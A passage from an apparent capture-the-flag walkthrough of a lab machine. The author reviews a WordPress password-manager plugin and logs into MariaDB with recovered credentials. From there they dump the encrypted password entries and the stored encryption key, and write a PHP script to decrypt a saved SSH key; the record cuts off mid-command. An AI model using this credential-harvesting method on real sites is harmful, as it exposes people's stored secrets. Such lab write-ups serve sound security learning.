I noted earlier the existence of the `passwords-manager` plugin. From [its own page](https://wordpress.org/plugins/passwords-manager/):

> Passwords Manager wordpress plugin let you to store different passwords at one place. Passwords are stored in WordPress database in encrypted form so no one can see them. Passwords can also be categorized if you have multiple passwords. This plugin uses advanced encryption standard AES – 128 and you can define your encryption key at the time of installation of plugin.

There’s a download button on the site, which I’ll use to get a zip of the source, the current version being 1.4.6, at <https://downloads.wordpress.org/plugin/passwords-manager.1.4.6.zip>. The structure of the files doesn’t quite match the version on Moderators. To make sure I have the same version as what’s on Moderators (1.4.1), I’ll modify that download link to match the version I want, and it works.

#### Source Code Analysis

In the root of the plugin, there’s a `pwds-manager.php` file. In that file, there’s a function `pms_db_install`, which sets up the database:

```

        /*
        **Create Datatable for plugin  activation
        */
        if ( ! function_exists('pms_db_install') ){
                function pms_db_install() {
                        global $wpdb;

                        /*
                        **create pms_category datatable
                        */
                        $table_name = $wpdb->prefix . 'pms_category';
                        $sql = "CREATE TABLE $table_name (
                                id int(11) NOT NULL AUTO_INCREMENT,
                                category varchar(55) DEFAULT '' NOT NULL,
                                PRIMARY KEY  (id)
                        )ENGINE=InnoDB DEFAULT CHARSET=latin1";
                        require_once( ABSPATH . 'wp-admin/includes/upgrade.php' );
                        dbDelta( $sql );
                        $result =       $wpdb->insert(
                                $table_name,
                                array('category' =>'Uncategorized',) ,
                                array('%s')
                        );

                        /*
                        **create pms_passwords datatable
                        */
                        $table_name = $wpdb->prefix . 'pms_passwords';
                        $sql1 = "CREATE TABLE $table_name (
                                pass_id int(11) NOT NULL AUTO_INCREMENT,
                                user_name varchar(200) NOT NULL,
                                user_email varchar(200) NOT NULL,
                                user_password longtext NOT NULL,
                                category_id int(11) NOT NULL,
                                note text CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
                                url longtext NOT NULL,
                                PRIMARY KEY  (pass_id)
                        )ENGINE=InnoDB DEFAULT CHARSET=latin1";
                        dbDelta( $sql1 );
                }
                 register_activation_hook( __FILE__, 'pms_db_install' );
        }

```

It creates two tables, one for categories, and one for passwords. I’ll note that the passwords are in `[prefix]pms_passwords`. It seems a good guess that the `prefix` is `wp_`, which I can verify by connecting to the DB:

```

lexi@moderators:/opt/site.new$ mysql -u wordpressuser -p'wordpresspassword123!!' wordpress
...[snip]...
MariaDB [wordpress]> show tables;
+----------------------------+
| Tables_in_wordpress        |
+----------------------------+
| wp_commentmeta             |
| wp_comments                |
| wp_links                   |
| wp_options                 |
| wp_pms_category            |
| wp_pms_passwords           |
| wp_postmeta                |
| wp_posts                   |
| wp_prflxtrflds_fields_meta |
| wp_term_relationships      |
| wp_term_taxonomy           |
| wp_termmeta                |
| wp_terms                   |
| wp_usermeta                |
| wp_users                   |
| wp_wpfm_backup             |
+----------------------------+
16 rows in set (0.001 sec)

```

`wp_pms_passwords` is a table.

The `delete_plugin_database_tables` function is just as useful:

```

        /*
        **Drop datatable
        */
        if ( ! function_exists('delete_plugin_database_tables') ){
                function delete_plugin_database_tables(){
                        global $wpdb;
                                $prefix = $wpdb->prefix;
                                $tbl_name = $wpdb->prefix . "options";
                                $query  = "SELECT * FROM {$prefix}options where option_name LIKE 'pms_encrypt_key'";
                                $dlt_q  = $wpdb->get_row($query);
                                $keyId  = $dlt_q->option_id;
                                $rslt   = $wpdb->delete( $tbl_name, array( 'option_id' => $keyId ) );
                        $tableArray = array(
                          $wpdb->prefix . "pms_passwords",
                          $wpdb->prefix . "pms_category",
                       );

                      foreach ($tableArray as $tablename) {
                         $wpdb->query("DROP TABLE IF EXISTS $tablename");
                      }
                    }

                register_uninstall_hook(__FILE__, 'delete_plugin_database_tables');
        }

```

It shows deleting the two tables, but it also shows deleting an option from the `wp_options` table where the `option_name` is `pms_encrypt_key`.

Looking for where that key is used, I’ll find a handful of files:

```

oxdf@hacky$ grep -r 'pms_encrypt_key' .
./pwds-manager.php:                             $query  = "SELECT * FROM {$prefix}options where option_name LIKE 'pms_encrypt_key'";
./inc/pms-recs-action.php:              $key_qry  = "SELECT * FROM {$prefix}options where option_name='pms_encrypt_key'";
./inc/pms-recs-action.php:              $key_qry  = "SELECT * FROM {$prefix}options where option_name='pms_encrypt_key'";
./inc/pms_settings.php:                                                                 $query  = "SELECT * FROM {$prefix}options where option_name='pms_encrypt_key'";
./inc/pms_settings.php:                         $query  = "SELECT * FROM {$prefix}options where option_name='pms_encrypt_key'";
./inc/pwdms_recs.php:      $key_qry  = "SELECT * FROM {$prefix}options where option_name='pms_encrypt_key'";
./inc/pwdms_recs.php:                                   $query  = "SELECT * FROM {$prefix}options where option_name='pms_encrypt_key'";
./inc/pms-setting-action.php:                                           array('option_name' => 'pms_encrypt_key',
./include/pms-recs-action.php:          $key_qry  = get_option('pms_encrypt_key');     
./include/pms-recs-action.php:          $key_qry  = get_option('pms_encrypt_key');      
./include/pms_settings.php:     $query  = get_option('pms_encrypt_key');
./include/pms_settings.php:     $query  = get_option('pms_encrypt_key');        
./include/pwdms_recs.php:$key_qry  = get_option('pms_encrypt_key');     
./include/pms-setting-action.php:                                               update_option('pms_encrypt_key',$pwd);
./include/pms-setting-action.php:                                               if(get_option('pms_encrypt_key',true) == true){
./include/admin-page/addon/csv-import/pms-csv-import-setting-page/pms_import_html.php:                        <?php $encry_key = get_option('pms_encrypt_key'); ?>
./include/admin-page/addon/csv-import/index.php:            $encry_key = get_option('pms_encrypt_key');
./include/admin-page/addon/csv-import/index.php:    $qry  = get_option('pms_encrypt_key');
./include/admin-page/addon/csv-export/index.php:                                        $qry  = get_option('pms_encrypt_key');

```

Poking around in these results, `inc/pms-recs-action.php` defines a `decrypt_pass` function:

```

/**
**decrypt key
*/
if ( ! function_exists('decrypt_pass') ) {
    function decrypt_pass(){
        global $wpdb;
        $prefix = $wpdb->prefix;
        $key_qry  = "SELECT * FROM {$prefix}options where option_name='pms_encrypt_key'";
        $qry  = $wpdb->get_row($key_qry);
        $stng_key = esc_html($qry->option_value);

        if (class_exists('Encryption')) {
            $Encryption = new Encryption();
        } else {
            echo "Failed";
            die;
        }
        $saction  = sanitize_text_field($_POST['saction']);
        $enc_pass = sanitize_text_field($_POST['user_pwd']);
        if(isset($_POST)){
            if(     isset($saction) &&      ($saction       ==      'decrypt')){
                $dcryppwd        = $Encryption->decrypt($enc_pass, $stng_key);
                echo $dcryppwd;
                die;
            }
            else if(isset($saction) &&      ($saction       ==      'encrypt')){
                $id = absint($_POST['did']);
                $query  = "SELECT * FROM {$prefix}pms_passwords where pass_id = $id";
                $array  = $wpdb->get_results($query);
                $ecryppwd = esc_html($array[0]->user_password);
                echo $ecryppwd;
                die;
            }
        }
    }
}

```

It gets the key from the DB. It then gets the `Encryption` class and creates an object, eventually calling `->decrypt` on the encrypted password (from the user) and using the key from the DB.

#### Get Data From DB

With all that in mind, I’ll take a look at the DB. I’ll dump out `wp_pms_passwords`:

```

MariaDB [wordpress]> select user_name,user_email,url from wp_pms_passwords;
+---------------+---------------------+-----------------------+
| user_name     | user_email          | url                   |
+---------------+---------------------+-----------------------+
| SSH key       | john@moderators.htb | http://moderators.htb |
| Carls account | carl@moderators.htb | http://moderators.htb |
+---------------+---------------------+-----------------------+
2 rows in set (0.000 sec)

```

It looks like john keeps an SSH key in here. I’ll dump the value:

```

MariaDB [wordpress]> select user_name,user_password from wp_pms_passwords;
+---------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| user_name     | user_password                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
+---------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| SSH key       | eyJjaXBoZXJ0ZXh0IjoiVHI3cFFqRnlHemRoc1QyQjhLSFRtODZFYXhUb3pUY05iOWdwVjdKYmxIWFNDcVdOU2tmUmpCVmtPMGV0eUFTSDdVeG1MWERjNnhKY1I3aEVlMnRTMDhIMS90cGVQQjFLQ1JQdnViQTV3b3QvbFBDVzFFSHlVZFExZUJuMDVDM29qdmM3VkFMTXd2UkxaSGNOQ1JXQm9tdy9LWDhQS1I4SkNIWmRLMFhua3U2Z29SVkliczQycFRoc2w2MmdUaC95S3RIbGNUeHd6bWFuZWNrdnhPbzZXTS9SZG41RkdaR1ZoUXNxY3RDWWhvelJtaFA1ai9LeVFQbDNGcUNWSXNxbFVpWGRLM2xnYTBNdVVBZXhnQTFxSk8xbHZWZjYyQUloSnRhak4vQVJNOThiWXJMMXZIejVOSXlmMkI0K1M1R1RLZm5sTXROWjZiZEEwWFdUcGlvN250aHRRNUVDbUprcllPV1Y2Rkhwa2E1MkI0eEFGVURzbGkrclYvdkNHVzN2VnhuZFV6eGlPWXVXaFVWUXlHSHQwZXVubGIvaVZUbXBTS2lNOU9MZzlVWDNHekY5NGUzYTNNZ3VZTjhxTnZZMytLcjZKeDNlYk03SktmMXg1bm5QbGZSc01hRm1NcEwyaG8wSnRTTENhbUtweVlQMHBZMUFIWGU0eUx3VS9yVHhGdkkyUGFnL3JLVUcwSFhySnAxWEZXRStGb0hXMXBGZDR5dTdzaERVc2VLWVF3cWtHaCtxbFhnR1cwaFZwcXRDS3lCdnRMWUJCMFFZSS96dkFtdlU1Ni9TWTVxR0wvTXRMekZWbDJ2NXpaSFd1WEVjcFdtMXNkVDM3MXEvTHdXNFg3TWV1N2VFMTYrZERKRjFZVllqNGNFdVJ3RDhWU0RiMW8rUW1vZExpRXA5YjliOGljeGhMaWE0NE11UHdRVktJM1ViTmR6VGhlUjVzMjVxaS96MHdldFNBK283Z05iUjR3VVJVd0lOK3dMZkFkRGdzZXJEUkEvekxWRU1jWjRDTDQvcW5pdWNtbzBjdEw2dVphaWVsQy9nQmNBVlVxbGo1VjIzZkxiWXIyd0srN090N2ZGeDdQUnN1bVA5bXdKT1FOcmh5ZmVTSEZWNEZXS096U2J2YWtLMUtyeXJVdUI3OU1EbUl1ZmV0aGhvSGd4RGh4VG1SWUNDZ3g5MlRuZUF1eGNFYjJpeUtHb2RYN1J6ZEsyWmpqcCtYTVNoNmFEVWhEQ2hsSlh6c0FPQ090WXNWTjVkSGFWc3A5UWg5dnhrZFNka29hc2VZN1E5RnBlMy93NjhVcDYvN244MlpDb29TNjN5TERCOEdoWlhtUVBjTVBEeXd1M0x0aXVlN09JY2U0N2QxekUrVmk4amlIRjBVMmwvdm8rM2ZDTUIxU3lzQUVXc1pXUk1sOWVzcmxhdThNenlUWGkyZjgxa3RyTFFkSGhQY092RmFZbW5kS0djc1hXSnNOL256eXVvTlU5M3pERlZobFV6TVhGbWozWEhNTEpIeU96WXF1QjBiLzNXMk9paEM1cEZ5UjBvT2JEWUlxUFY4eWFzOEY3V1Exb2dJcEVhTk5BcGNUM3E0M2YyTFVWY3ByKythZEU3aGJrYmVOMVZGMDFqdGF5S0k4R0l6STBvYWhkSE9GUTNZZlcyWU5vY2NQV1dJQkw3WUkyTUF3R0E3OURheTMzeHVzQmJQNW8vNHJoclhReldGWnFKaTlBTWcydVZ3bzN2d3VVRkNIWkNtNGxKdXNiaFkyK3k1SklDbU1DNm04U1EvTUswR1V5WVlTSk12bDBVUUFTcjRWYmNpaTM3ZGpaVzFrKzVzRDNhanpxQVBncW9RcnRWNVp4ODh5Nms3ZDd4K2ZEVXh5VXBTNUt3OW5Ydm9tY1ZUMWNTRHd4aEc2QmlzS1dDY1Y1RXZqL2t4ZHZqZ3p4QjNtSlFFcVQya3ZNOGpqazVTSndCajV5dFdIQlZsYXhmMUNobjFUcTNtbnRlTjVHcmxxYXQ0Z3c5ajMzcFR3cmlZT3Z1RHAxQ2J3N1NocURoYWswTWt1eGRxaGRXRE5LYzFHL3M1TEdpR3dCdlBxT1M4TTAyOHBBSWQ4YzNtK0VyMXFUSEdLZXZJdnpseHZGTjYzZy83QklYaFRocis0cXlrVWFRMTVEU2VVd2lNUkhUVlhpcVlwc3JkMzVDUFRVOUl2cVN0aGZsbFhnTnl5R0djSFpvUkhLaE14SW41aGZNU1QzdGMza0JpWUh1R3haOEp2QzFCYUtrSHpiVVV6Tjg2YVczN2hSWVdhTnFnZ2JDMXVrTU5CZFZHbXhGaVRPd3pqRkh0ZFdxZ2RETnpPUVlwM3ZETmhSOXFDZUlpMVM3YmxFM1lYZkw5T3A0QlI3bW9mRTFNWWluYS9hUElhNTBvS3cxcHU3YjNqNGNRci9CYm1PeURKM2I5YlhwT0xpV0N3RjlEcHlMbDhkWWZvcm1uVThDaFIyWVU5MWtBcXhkZnJvRUpRM1Nzdm92TU40TGhraktBYW42YTRuWFoxQW8zK0NldytERGhYUVhFQ24zbGNYTklyQkJmS2ZkZGFBWTE0WEM5cDBTZEttRFJBdjBodDRPTk0rT1pIbkdMdGlRZFRpc0c4VVB2ODRFSDFoczFYNXh3YXNCb0hBSGRMQnRJSnVIRDhjYU1ORlkxQmROaXk3cURLU2ZtTWU4MTArVXB5UkZJMUVLRndlZGN2YUZqSTNMRzhIajUyZTVmTVltMGU3ckNrRXN0SGlLRTU2SDlkaU8xRVRNa2JOTFA3N0svNDd3eW0rZ3lQS0JnL2pVODMyelEwSGJyNGllVk1wY3d4b0tpRkFDZlRiVzc5dVJybEtibDJldE42NFU2NkhtU3NteFV2TDF5OHlzbXVNMW5CTW5FWUVRdmg1eXBoOGdpTmovZnRENlVlYms0K1pWZW54cncremlPNHVrWnZFeWlab25Ec1VydExSUEcrRU5mSXVIMG1tajNibFdUeSszQzV4QVZSSHhhR0dIUm1xUTBSVDVONUZaZEEyVjVZRno1aDAvdDBoTmJLUldxMlljWjNPL0hDemQ0cmRyalFSY1g4WGFzdXZRU2NwSW5rei9LVFQ5VkJTZUppdm55OElVdUNnMWRsVUFiYTM3QTVWa0hjK3BEeVJzQXdxZWlSTHJoTTRrdkdHUTZyc3JmbzdpcEFkVVRtQytqaFlqQkRGcWVjMXl4UW5QN3FQUU5rcGdUekhSS2wrN0hCbWc0SU5qeDNQYzJRK25SZ2ZSeXV1eWxyYkFEK1QzcUcyU2FwbDFZTkdjdElyRFVLbW5keWlXTEdJVE1aV0lrcDZyZ2VVQ0lvckQ1c1JiRXgxZ0lVUzkzNEp5L1NDQVZ2c284c1hKeFl6WmRwYnBIK0ZqdDRZYlFCaVpGdWZCZTFkU29KdzFFQmhKUWpYUjZmWjNxcGdXcCs4dzZFVWprbzM0aEJXOFpmaFhTMitzTk9aZERXelQ4d0JSMTJWRTQ0OFdLVzBNM0xyN01kWXl3WkY3Q3I2alR0UXZFNW5CdTlOUHFDZ1dmZTRRcE5vSW45d1VWSVV3citEbStIK3U1cWxKZk1RUGIxRkFSNXFST2owQmQ3RjRoK1VvUUtUbE5FcUN6bFdXMGJZM1l6dWRUa1k4VTN3cTRmbjlEQUlwWGtvZVRNNERpMndhUjBZYXZVaUJMcHBuMXp0a3JIaElYSityWmRqYXdEZ01reVdzb0ZYakZhR2hZTjRvdlBHaXU4NVU5VmU2bndmUjVSVGxDUVhaMXpLVzlrNk9JMHNGTHRrU1F0QXRrUFpSVWl1QXM4SDNkNTQ3VkZlTVpJNFRJcVJyYk9CeDB1R2c4eXRtYzZ3NFpZNFlJSVprd0NLVXBRejJQZmdibmNJOXhSMHBwMDRKVkQ4R2Vuczg4M3JGUjJFQnhTUFZxSjdVSmxESWp4ZDRIU21rK2ZPS3dnS2FYNFFDTGNiVWxLalFKSWlXZFFLQ1pOUW5aeGJNWW5LM0NHU2FucmdWNERhc0pPSThNaVZ1VDUxd3I4VFlEL2VaTFErOCt6Q3pmMnF1VGNWNEtnSlByaUFJQWJNL0ovZWxZSTJpcmVYbXppbVp0N2MydWdpYzhZVVM3eGtocTRYbUlPVGx3RDEzZWk4ZkhVNStYdVBzS1IyUWxVM1Ayd1pFb0UrRnBqVExxa2k4NlBBcU82QjZiWTVtNmJHTERpZ0lVUWtNVExqOWZ4dFEwVDgxNC9oSk4vS2tGSFRFWEduWnVwQkpWT0s3Q2hxazZJVmVCZVh3eU1tUkw3TmhNajBYOG1JR2g2YVJmVFpZQVZUczBkWnVJSTVOUURqTGRMb3Jkb3ZQL0lxdjhWam0wOG9FaEhtZUszYzI4eVBJb3VQTlRsL1lMZ1M3NlBnbU84dGtZZTR1Z3JKK2dKMzhHc2NzQm91REl3bk82OG1ZV1o5c1F5cG85U0tvbE51TjJ5VCtFQWE1eEcwOUc3aXZaS0hZVWQybU0xQlcxaHkveVBJcUZEcXR4ZTgyMWp4Vm85UVltS2krOUUvanUraXdkYVNIVDJFSWZzMk1CQUFlVzVCcEIvS0MvbGJGRzljWmpnMERURW1zUzIrczYwR3pNdz09IiwiaXYiOiJiNWE1ZWJhMTQ1MzVkYTZiYTIwZDNkNGI5ZjdiZGFjYyIsInNhbHQiOiJkMDgwNzAzM2JkNDNlYWZkNmVlNDdkMzQ5ZDQzODA0MzY1OWMyNTBhOWQ3OTc3NGJiMmEwYzU1OWFhNjA4ZDNiNjFkNDVkZGViNTU0NTc4ZTNlYTQwODJmNzBmYmVjYWM1ZWM2NWE4NjlmMzI0MjU4NjUxMGZkMmYyZTBkYTkzZmM1MDEzOTk2OTQ5MWNkNDU2MzA2MDExZjY5NWFkYzJkYjBlMTMwNDM2YWViZjJmMzRmMDBkZmFkZDJjYWZiZWZjYzg0MmUzNzk4MmI5NmNmNDhkZDc4YjczYjYxNGY0YzljOTIwYzllY2NlOWRjY2Y2NmM3YmNiYzQ5YWFiM2NmYzI5N2UxMGY2NDcwY2I2YjY2NzAxYTFhNjhlZDBiYWQ5OWZiMDk0NDQyZmUzYjEwNDEyN2ZjMTk2Y2FhYmZhY2I3YjU5MTc4NjE1OTZiZjU0NWM3NDkwNjZiNGJlZmNiYTg2Zjg1NmM5M2U2YTI5MzZjNjM2NGQ3NGEyMjQ2Nzc5ZTJmYjEyYmMwYzUwYjE5NmFkOTI0Nzc0NDU4YjUyZjQxYmU5NTUyM2ExMDljMjMzZWM2NzFiNmIyNWFhYjJlNWU1ZjVkNDJhMTVlYmNiMDNmZjE5ODFiYmJiODdkMGFkM2M1NDRlMzUyN2QwOWU3YmI5YjA5ZjI1NjYzYzY3YSIsIml0ZXJhdGlvbnMiOjk5OX0= |
| Carls account | eyJjaXBoZXJ0ZXh0IjoiRDNjeldlUFdBQ3E3UkFmQldxcnluUT09IiwiaXYiOiI5ZmJhYmFkNzYzOTZmNjc3NTliNjc0YzQ0ZTFhNGFhZiIsInNhbHQiOiI1ZmM1Yzk1NDZiMmQ5ZmUwY2EyZTFhYWYyZWNiOTM1MjMxMWNmZWIyM2EyZmRiNDg1OTVmMzI4YWNlNmVkNjZhY2NkZjllMTk0NzRlMmMxMjU2NmRmOTYwNWYxZDYzNThhNjU1NzEzMTJjZTY2NWFhYWJiM2Q0NjU2YmY4Yzc4MWNlYjdhNWFlMzY5Y2IxMzVjOWUzMzhhNDRhMzg0N2I0MzRiZDg3OGY5MDFlZmQ1MjNjYjY5OWZlYmNhNzEyNmVjMzRlYWQ1MzQyNGE3OTJlOWIxNDYyNDJiYjIyNzY3YzZkNDc1ZDk3NmU5NWJjMzE2ODk4NTUxMzQxZGZmM2JlY2Q3MzVkOGQ1ODEyZTBjZmMzYzA4YmEwYjk1NmM0Yzg2OTk0MzZkYjQ2YmMwNTA4YzUzMjU4OGE0NzAwOThhMzRmMmY0ZTMyY2MxNDkzOTUyYzEwNmYyMGNmODE5ZDIwNmEzYjEwOWFjNGNiZjEzZDVlZTNhYzFiOTRkZjBiOTA1ZGNhOGE1MjQ3YzgwNmVkOWJkM2Y2NTQ0MDQ2NzIwMDUxZjhjZjFhM2M5NWY4NDQ0ZWQyN2NkNGMzMjllOGNhYjg4NGQ1NTBiNjkxYTlkNjRkOTI4ZGMwYmQ2ZWYwM2M1OTMyMmVmYjU0NmY0OTcyMmQ5ODYyZTk0NmZhMmRhMSIsIml0ZXJhdGlvbnMiOjk5OX0=                                                                                                                                                                                                     |
+---------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
2 rows in set (0.000 sec)

```

I’ll also dump the `pms_encrypt_key`:

```

MariaDB [wordpress]> select * from wp_options where option_name LIKE 'pms_encrypt_key';
+-----------+-----------------+------------------+----------+
| option_id | option_name     | option_value     | autoload |
+-----------+-----------------+------------------+----------+
|       460 | pms_encrypt_key | (@McEXk%HU#{/R3s | yes      |
+-----------+-----------------+------------------+----------+
1 row in set (0.001 sec)

```

#### Decrypt

The easiest way to do this is to make a PHP script based on the `Encryption` class. It’s defined in `/inc/encryption.php`:

```

oxdf@hacky$ grep -r 'class Encryption' .
./inc/encryption.php:class Encryption
./assets/js/encryption.js:class Encryption {
./include/encryption.php:class Encryption

```

I’ll copy that class to a local script and edit it:

```

oxdf@hacky$ cp passwords-manager/inc/encryption.php decrypt_key.php
oxdf@hacky$ vim decrypt_key.php 

```

I’ll leave all the existing code the same, but add four lines to the end:

```

$enc_text = $argv[1];
$e = new Encryption();
$plain = $e->decrypt($enc_text, '(@McEXk%HU#{/R3s');
echo $plain .'\n';

```

This will take the first argument, and decrypt it using the same `Encryption` class and its `decrypt` function.

It works:

```

oxdf@hacky$ php decrypt_key.php eyJjaXBoZXJ0ZXh0IjoiVHI3cFFqRnlHemRoc1QyQjhLSFRtODZFYXhUb3pUY05iOWdwVjdKYmxIWFNDcVdOU2tmUmpCVmtPMGV0eUFTSDdVeG1MWERjNnhKY1I3aEVlMnRTMDhIMS90cGVQQjFLQ1JQdnViQTV3b3QvbFBDVzFFSHlVZFExZUJuMDVDM29qdmM3VkFMTXd2UkxaSGNOQ1JXQm9tdy9LWDhQS1I4SkNIWmRLMFhua3U2Z29SVkliczQycFRoc2w2MmdUaC95S3RIbGNUeHd6bWFuZWNrdnhPbzZXTS9SZG41RkdaR1ZoUXNxY3RDWWhvelJtaFA1ai9LeVFQbDNGcUNWSXNxbFVpWGRLM2xnYTBNdVVBZXhnQTFxSk8xbHZWZjYyQUloSnRhak4vQVJNOThiWXJMMXZIejVOSXlmMkI0K1M1R1RLZm5sTXROWjZiZEEwWFdUcGlvN250aHRRNUVDbUprcllPV1Y2Rkhwa2E1MkI0eEFGVURzbGkrclYvdkNHVzN2VnhuZFV6eGlPWXVXaFVWUXlHSHQwZXVubGIvaVZUbXBTS2lNOU9MZzlVWDNHekY5NGUzYTNNZ3VZTjhxTnZZMytLcjZKeDNlYk03SktmMXg1bm5QbGZSc01hRm1NcEwyaG8wSnRTTENhbUtweVlQMHBZMUFIWGU0eUx3VS9yVHhGdkkyUGFnL3JLVUcwSFhySnAxWEZXRStGb0hXMXBGZDR5dTdzaERVc2VLWVF3cWtHaCtxbFhnR1cwaFZwcXRDS3lCdnRMWUJCMFFZSS96dkFtdlU1Ni9TWTVxR0wvTXRMekZWbDJ2NXpaSFd1WEVjcFdtMXNkVDM3MXEvTHdXNFg3TWV1N2VFMTYrZERKRjFZVllqNGNFdVJ3RDhWU0RiMW8rUW1vZExpRXA5YjliOGljeGhMaWE0NE11UHdRVktJM1ViTmR6VGhlUjVzMjVxaS96MHdldFNBK283Z05iUjR3VVJVd0lOK3dMZkFkRGdzZXJEUkEvekxWRU1jWjRDTDQvcW5pdWNtbzBjdEw2dVphaWVsQy9nQmNBVlVxbGo1VjIzZkxiWXIyd0srN090N2ZGeDdQUnN1bVA5bXdKT1FOcmh5ZmVTSEZWNEZXS096U2J2YWtLMUtyeXJVdUI3OU1EbUl1ZmV0aGhvSGd4RGh4VG1SWUNDZ3g5MlRuZUF1eGNFYjJpeUtHb2RYN1J6ZEsyWmpqcCtYTVNoNmFEVWhEQ2hsSlh6c0FPQ090WXNWTjVkSGFWc3A5UWg5dnhrZFNka29hc2VZN1E5RnBlMy93NjhVcDYvN244MlpDb29TNjN5TERCOEdoWlhtUVBjTVBEeXd1M0x0aXVlN09JY2U0N2QxekUrVmk4amlIRjBVMmwvdm8rM2ZDTUIxU3lzQUVXc1pXUk1sOWVzcmxhdThNenlUWGkyZjgxa3RyTFFkSGhQY092RmFZbW5kS0djc1hXSnNOL256eXVvTlU5M3pERlZobFV6TVhGbWozWEhNTEpIeU96WXF1QjBiLzNXMk9paEM1cEZ5UjBvT2JEWUlxUFY4eWFzOEY3V1Exb2dJcEVhTk5BcGNUM3E0M2YyTFVWY3ByKythZEU3aGJrYmVOMVZGMDFqdGF5S0k4R0l6STBvYWhkSE9GUTNZZlcyWU5vY2NQV1dJQkw3WUkyTUF3R0E3OURheTMzeHVzQmJQNW8vNHJoclhReldGWnFKaTlBTWcydVZ3bzN2d3VVRkNIWkNtNGxKdXNiaFkyK3k1SklDbU1DNm04U1EvTUswR1V5WVlTSk1